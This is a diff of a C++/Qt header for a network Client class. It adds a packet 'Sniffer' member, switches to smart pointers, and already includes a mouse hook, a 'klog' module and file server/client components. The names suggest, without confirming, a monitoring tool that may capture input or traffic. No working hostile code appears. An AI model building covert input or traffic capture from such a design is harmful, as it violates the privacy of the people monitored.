@@ -1,15 +1,16 @@
-#ifndef CLIENT_H
-#define CLIENT_H
+#pragma once
+#include <memory>
 
 #include <QObject>
 #include <QTimer>
 #include <QThread>
 
+#include "sniffer.h"
 #include "config.h"
 #include "fileserver.h"
 #include "fileclient.h"
-#include "mousehookWinApi.h"
-#include "files.h"
+#include "mousehook.h"
+#include "enums.h"
 #include "klog.h"
 
 class Client : public QObject
@@ -33,13 +34,12 @@ private:
     void enqueueLog();
 
     quint16 locPort;
-    QString ip;
     qint16 destPort;
+    QString ip;
     QString path;
-    QTimer* onlineTimer;
-    Config* config;
-    FileServer* fileServer;
-    FileClient* fileClient;
+    std::unique_ptr<QTimer> onlineTimer;
+    std::unique_ptr<Config> config;
+    std::unique_ptr<FileServer> fileServer;
+    std::unique_ptr<FileClient> fileClient;
+    std::unique_ptr<Sniffer> sniffer;
 };
-
-#endif // CLIENT_H
